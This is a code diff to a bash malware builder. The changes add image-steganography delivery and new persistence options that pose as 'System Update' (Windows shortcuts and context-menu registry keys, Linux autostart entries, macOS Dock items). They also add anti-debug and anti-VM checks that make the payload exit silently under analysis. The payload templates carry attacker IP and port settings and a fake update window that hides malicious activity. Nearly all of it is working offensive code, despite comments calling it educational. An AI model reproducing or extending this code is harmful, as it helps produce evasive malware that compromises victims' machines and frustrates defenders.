@@ -26,6 +26,7 @@ CONFIG_FILE=".fire_config"
 TEMP_DIR="/tmp/fire_temp_$$"
 DELIVERY_DIR="./fire_delivery"
 CLOUDFLARED_DIR="./cloudflared"
+IMAGES_DIR="./fire_images"
 
 # Advanced configuration options
 declare -A ENCRYPTION_ALGORITHMS=(
@@ -67,10 +68,11 @@ declare -A DELIVERY_METHODS=(
     ["5"]="social_engineering"
     ["6"]="bundle"
     ["7"]="cloudflare_tunnel"
+    ["8"]="image_steganography"  # New: Image-based delivery
 )
 
 # Global variables
-SCRIPT_VERSION="7.9-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec-FakeGUI-FixedIndent-Enhanced"
+SCRIPT_VERSION="8.1-Image-Steganography-Delivery-Only-CrossPlatform"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
@@ -98,6 +100,7 @@ CLOUDFLARE_TUNNEL_URL=""
 CLOUDFLARE_TUNNEL_PORT="8080"
 AUTO_EXECUTION=true  
 FAKE_GUI_ENABLED=true # New: Enables a fake "System Update" window
+AUTO_LAUNCH_METHOD="lnk" # New: Method for auto-launch (lnk, shortcut, autorun)
 
 # Platform detection
 detect_platform() {
@@ -301,6 +304,11 @@ check_dependencies() {
         optional_deps+=("wget or curl (for downloading cloudflared)")
     fi
     
+    # Check for image manipulation tools
+    if ! command -v convert &> /dev/null; then
+        optional_deps+=("ImageMagick (for image steganography)")
+    fi
+    
     if [ ${#missing_deps[@]} -ne 0 ] || [ ${#outdated_deps[@]} -ne 0 ]; then
         echo -e "${R}[!] Critical dependencies missing or outdated:${NC}"
         
@@ -461,6 +469,7 @@ setup_environment() {
     TEMP_DIR=$(get_temp_dir)
     ensure_dir "$TEMP_DIR"
     ensure_dir "$DELIVERY_DIR"
+    ensure_dir "$IMAGES_DIR"
     
     if [ ! -d "$VENV_DIR" ]; then
         echo -e "${Y}[*] Creating isolated Python environment...${NC}"
@@ -491,7 +500,7 @@ setup_environment() {
         log_message "WARNING" "Failed to upgrade pip/setuptools"
     fi
     
-    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask")
+    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask" "pillow" "stegano")
     
     for package in "${required_packages[@]}"; do
         if ! python3 -c "import ${package//-/_}" &> /dev/null; then
@@ -652,43 +661,51 @@ get_configuration() {
             echo "2) Windows Startup Folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp)"
             echo "3) WMI Event Subscription"
             echo "4) Scheduled Task"
+            echo "5) LNK File (Desktop Shortcut)"
+            echo "6) Shell Extension (Context Menu)"
         elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
-            echo "5) Cron Job"
-            echo "6) Systemd Service (/lib/systemd/system/)"
-            echo "7) Init.d Script"
-            echo "8) Profile Modification"
+            echo "7) Cron Job"
+            echo "8) Systemd Service (/lib/systemd/system/)"
+            echo "9) Init.d Script"
+            echo "10) Profile Modification"
+            echo "11) Desktop Shortcut (.desktop)"
         elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
-            echo "9) LaunchAgent (/Library/LaunchAgents/)"
-            echo "10) LaunchDaemon (/Library/LaunchDaemons/)"
-            echo "11) Login Item"
-            echo "12) Cron Job"
+            echo "12) LaunchAgent (/Library/LaunchAgents/)"
+            echo "13) LaunchDaemon (/Library/LaunchDaemons/)"
+            echo "14) Login Item"
+            echo "15) Cron Job"
+            echo "16) Dock Shortcut"
         fi
         
         while true; do
             read -p ">> " pers_choice
             if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                 case $pers_choice in
-                    1) PERSISTENCE_METHOD="registry"; break ;;
-                    2) PERSISTENCE_METHOD="windows_startup"; break ;;
-                    3) PERSISTENCE_METHOD="wmi_subscription"; break ;;
-                    4) PERSISTENCE_METHOD="scheduled_task"; break ;;
-                    *) echo -e "${R}[!] Invalid choice. Please enter 1-4.${NC}" ;;
+                    1) PERSISTENCE_METHOD="registry"; AUTO_LAUNCH_METHOD="registry"; break ;;
+                    2) PERSISTENCE_METHOD="windows_startup"; AUTO_LAUNCH_METHOD="startup"; break ;;
+                    3) PERSISTENCE_METHOD="wmi_subscription"; AUTO_LAUNCH_METHOD="wmi"; break ;;
+                    4) PERSISTENCE_METHOD="scheduled_task"; AUTO_LAUNCH_METHOD="task"; break ;;
+                    5) PERSISTENCE_METHOD="lnk_file"; AUTO_LAUNCH_METHOD="lnk"; break ;;
+                    6) PERSISTENCE_METHOD="shell_extension"; AUTO_LAUNCH_METHOD="shell"; break ;;
+                    *) echo -e "${R}[!] Invalid choice. Please enter 1-6.${NC}" ;;
                 esac
             elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                 case $pers_choice in
-                    5) PERSISTENCE_METHOD="cron"; break ;;
-                    6) PERSISTENCE_METHOD="linux_systemd"; break ;;
-                    7) PERSISTENCE_METHOD="init_script"; break ;;
-                    8) PERSISTENCE_METHOD="profile_mod"; break ;;
-                    *) echo -e "${R}[!] Invalid choice. Please enter 5-8.${NC}" ;;
+                    7) PERSISTENCE_METHOD="cron"; AUTO_LAUNCH_METHOD="cron"; break ;;
+                    8) PERSISTENCE_METHOD="linux_systemd"; AUTO_LAUNCH_METHOD="systemd"; break ;;
+                    9) PERSISTENCE_METHOD="init_script"; AUTO_LAUNCH_METHOD="init"; break ;;
+                    10) PERSISTENCE_METHOD="profile_mod"; AUTO_LAUNCH_METHOD="profile"; break ;;
+                    11) PERSISTENCE_METHOD="desktop_shortcut"; AUTO_LAUNCH_METHOD="desktop"; break ;;
+                    *) echo -e "${R}[!] Invalid choice. Please enter 7-11.${NC}" ;;
                 esac
             elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                 case $pers_choice in
-                    9) PERSISTENCE_METHOD="macos_launchagent"; break ;;
-                    10) PERSISTENCE_METHOD="macos_launchdaemon"; break ;;
-                    11) PERSISTENCE_METHOD="login_item"; break ;;
-                    12) PERSISTENCE_METHOD="cron"; break ;;
-                    *) echo -e "${R}[!] Invalid choice. Please enter 9-12.${NC}" ;;
+                    12) PERSISTENCE_METHOD="macos_launchagent"; AUTO_LAUNCH_METHOD="launchagent"; break ;;
+                    13) PERSISTENCE_METHOD="macos_launchdaemon"; AUTO_LAUNCH_METHOD="launchdaemon"; break ;;
+                    14) PERSISTENCE_METHOD="login_item"; AUTO_LAUNCH_METHOD="login"; break ;;
+                    15) PERSISTENCE_METHOD="cron"; AUTO_LAUNCH_METHOD="cron"; break ;;
+                    16) PERSISTENCE_METHOD="dock_shortcut"; AUTO_LAUNCH_METHOD="dock"; break ;;
+                    *) echo -e "${R}[!] Invalid choice. Please enter 12-16.${NC}" ;;
                 esac
             fi
         done
@@ -734,12 +751,13 @@ get_configuration() {
     echo "5) Social Engineering Kit"
     echo "6) Application Bundling"
     echo "7) Cloudflare Tunnel (Secure Remote Access)"
-    echo "8) Skip Delivery (Generate Only)"
+    echo "8) Image Steganography (Hide in Image)"
+    echo "9) Skip Delivery (Generate Only)"
     
     while true; do
         read -p "Select delivery method: " delivery_choice
-        if [[ "$delivery_choice" =~ ^[1-8]$ ]]; then
-            if [ "$delivery_choice" -eq 8 ]; then
+        if [[ "$delivery_choice" =~ ^[1-9]$ ]]; then
+            if [ "$delivery_choice" -eq 9 ]; then
                 DELIVERY_METHOD=""
                 log_message "INFO" "Skipping delivery configuration"
                 break
@@ -749,7 +767,7 @@ get_configuration() {
                 break
             fi
         else
-            echo -e "${R}[!] Invalid delivery method. Please enter a number between 1-8.${NC}"
+            echo -e "${R}[!] Invalid delivery method. Please enter a number between 1-9.${NC}"
         fi
     done
 
@@ -778,6 +796,66 @@ get_configuration() {
                 CLOUDFLARE_TUNNEL_PORT=${tunnel_port:-$CLOUDFLARE_TUNNEL_PORT}
                 DELIVERY_TARGETS="$CLOUDFLARE_TUNNEL_PORT"
                 CLOUDFLARE_TUNNEL_ENABLED=true
+                ;;
+            "image_steganography")
+                # Image steganography configuration - only when this delivery method is selected
+                echo -e "\n${B}IMAGE STEGANOGRAPHY CONFIGURATION:${NC}"
+                
+                # List available images
+                echo -e "\n${Y}Available images:${NC}"
+                if [ -d "$IMAGES_DIR" ] && [ "$(ls -A "$IMAGES_DIR" 2>/dev/null)" ]; then
+                    local i=1
+                    for img in "$IMAGES_DIR"/*.{jpg,jpeg,png,bmp,gif}; do
+                        if [ -f "$img" ]; then
+                            echo "$i) $(basename "$img")"
+                            i=$((i+1))
+                        fi
+                    done
+                    
+                    # Allow user to select an image
+                    while true; do
+                        read -p "Select an image or enter path to a new image: " img_choice
+                        if [[ "$img_choice" =~ ^[0-9]+$ ]]; then
+                            # User selected from list
+                            local selected_img=$(ls "$IMAGES_DIR"/*.{jpg,jpeg,png,bmp,gif} | sed -n "${img_choice}p")
+                            if [ -f "$selected_img" ]; then
+                                IMAGE_FILE="$selected_img"
+                                break
+                            else
+                                echo -e "${R}[!] Invalid selection. Please try again.${NC}"
+                            fi
+                        else
+                            # User entered a path
+                            if [ -f "$img_choice" ]; then
+                                IMAGE_FILE="$img_choice"
+                                # Copy to images directory for future use
+                                cp "$img_choice" "$IMAGES_DIR/"
+                                break
+                            else
+                                echo -e "${R}[!] File not found. Please try again.${NC}"
+                            fi
+                        fi
+                    done
+                else
+                    # No images available, ask for path
+                    while true; do
+                        read -p "Enter path to an image file (jpg, jpeg, png, bmp, gif): " img_path
+                        if [ -f "$img_path" ]; then
+                            IMAGE_FILE="$img_path"
+                            # Copy to images directory for future use
+                            ensure_dir "$IMAGES_DIR"
+                            cp "$img_path" "$IMAGES_DIR/"
+                            break
+                        else
+                            echo -e "${R}[!] File not found. Please try again.${NC}"
+                        fi
+                    done
+                fi
+                
+                read -p "Enter output filename for steganographic image [default: stego_image.png]: " stego_output
+                DELIVERY_TARGETS=${stego_output:-"stego_image.png"}
+                
+                log_message "INFO" "Image steganography enabled with image: $IMAGE_FILE"
                 ;;
         esac
         log_message "INFO" "Delivery targets: $DELIVERY_TARGETS"
@@ -867,6 +945,7 @@ DELIVERY_METHOD="$DELIVERY_METHOD"
 DELIVERY_TARGETS="$DELIVERY_TARGETS"
 CLOUDFLARE_TUNNEL_ENABLED=$CLOUDFLARE_TUNNEL_ENABLED
 CLOUDFLARE_TUNNEL_PORT="$CLOUDFLARE_TUNNEL_PORT"
+AUTO_LAUNCH_METHOD="$AUTO_LAUNCH_METHOD"
 EOF
     log_message "INFO" "Configuration saved to $CONFIG_FILE"
 }
@@ -889,6 +968,10 @@ validate_config() {
     [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Multi-OS" ] && errors+=("Invalid target OS: $TARGET_OS")
     
     [[ ! "$PAYLOAD_TYPE" =~ ^[1-9]$ ]] && errors+=("Invalid payload type: $PAYLOAD_TYPE")
+    
+    if [ "$DELIVERY_METHOD" = "image_steganography" ] && [ ! -f "$IMAGE_FILE" ]; then
+        errors+=("Image steganography selected but image file not found: $IMAGE_FILE")
+    fi
     
     if [ ${#errors[@]} -ne 0 ]; then
         echo -e "${R}[!] Configuration validation failed:${NC}"
@@ -1003,6 +1086,7 @@ SHA256: $file_hash
 Encryption Algorithm: $ENCRYPTION_ALGORITHM
 Obfuscation Level: $OBFUSCATION_LEVEL
 Persistence Method: $PERSISTENCE_METHOD
+Auto-Launch Method: $AUTO_LAUNCH_METHOD
 Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
 Anti-VM Enabled: $ANTI_VM_ENABLED
 Packer Enabled: $PACKER_ENABLED
@@ -1049,9 +1133,9 @@ If enabled, payload will display a fake "System Update" window
 to mask malicious activity and ensure immediate user interaction.
 
 Supported Platforms:
-- Windows (Registry, Startup Folder, WMI, Scheduled Tasks)
-- Linux (Cron, Systemd, Init.d, Profile)
-- macOS (LaunchAgent, LaunchDaemon, Login Items, Cron)
+- Windows (Registry, Startup Folder, WMI, Scheduled Tasks, LNK Files, Shell Extensions)
+- Linux (Cron, Systemd, Init.d, Profile, Desktop Shortcuts)
+- macOS (LaunchAgent, LaunchDaemon, Login Items, Cron, Dock Shortcuts)
 EOF
                 
                 echo -e "${G}[+] Multi-OS build complete!${NC}"
@@ -1151,6 +1235,7 @@ SHA256: $file_hash
 Encryption Algorithm: $ENCRYPTION_ALGORITHM
 Obfuscation Level: $OBFUSCATION_LEVEL
 Persistence Method: $PERSISTENCE_METHOD
+Auto-Launch Method: $AUTO_LAUNCH_METHOD
 Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
 Anti-VM Enabled: $ANTI_VM_ENABLED
 Packer Enabled: $PACKER_ENABLED
@@ -1331,13 +1416,21 @@ import time
 import platform
 import subprocess
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
 ATTACKER_IP = "$attacker_ip"
 ATTACKER_PORT = "$attacker_port"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1411,6 +1504,35 @@ def setup_persistence_windows():
             # Create scheduled task
             task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
             subprocess.run(task_cmd, shell=True, check=False)
+            
+        elif PERSISTENCE_METHOD == "lnk_file":
+            # Create LNK file on desktop
+            import pythoncom
+            from win32com.shell import shell, shellcon
+            
+            desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+            shortcut_path = os.path.join(desktop, "System Update.lnk")
+            
+            if not os.path.exists(shortcut_path):
+                shortcut = pythoncom.CoCreateInstance(
+                    shell.CLSID_ShellLink, None,
+                    pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                )
+                shortcut.SetPath(exe_path)
+                shortcut.SetDescription("System Update")
+                shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                
+                persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                persist_file.Save(shortcut_path, 0)
+            
+        elif PERSISTENCE_METHOD == "shell_extension":
+            # Add to right-click context menu
+            reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                
+            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1526,6 +1648,25 @@ exit \$RETVAL
                 f.write(f"#!/bin/bash\n{exe_path} &\n")
             os.chmod(profile_path, 0o755)
             
+        elif PERSISTENCE_METHOD == "desktop_shortcut":
+            # Create .desktop file
+            desktop_dir = os.path.expanduser("~/.config/autostart")
+            if not os.path.exists(desktop_dir):
+                os.makedirs(desktop_dir)
+                
+            desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+            if not os.path.exists(desktop_file):
+                with open(desktop_file, "w") as f:
+                    f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                os.chmod(desktop_file, 0o755)
+            
     except Exception as e:
         # Silently handle errors in educational context
         pass
@@ -1607,6 +1748,17 @@ end tell
             
             subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
             os.remove("/tmp/crontab.txt")
+            
+        elif PERSISTENCE_METHOD == "dock_shortcut":
+            # Add to Dock
+            dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+            subprocess.run(["osascript", "-e", dock_script], check=False)
         
     except Exception as e:
         # Silently handle errors in educational context
@@ -1655,7 +1807,77 @@ def execute_payload():
         # Unknown OS, execute generic payload
         time.sleep(2)
 
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
+
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     # First, set up persistence
     setup_persistence()
     
@@ -1694,11 +1916,19 @@ import time
 import platform
 import subprocess
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1762,6 +1992,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -1868,6 +2127,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -1940,10 +2218,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -1951,6 +2305,11 @@ def execute_payload():
     time.sleep(3)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         # Run payload in background thread
         t = threading.Thread(target=execute_payload)
@@ -1985,13 +2344,21 @@ import platform
 import subprocess
 import os
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
 ATTACKER_IP = "$attacker_ip"
 ATTACKER_PORT = "$attacker_port"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -2055,6 +2422,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -2161,6 +2557,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -2233,10 +2648,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -2245,6 +2736,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -2274,11 +2770,19 @@ import platform
 import subprocess
 from cryptography.fernet import Fernet
 import threading
+import base64
+import tempfile
+import shutil
 
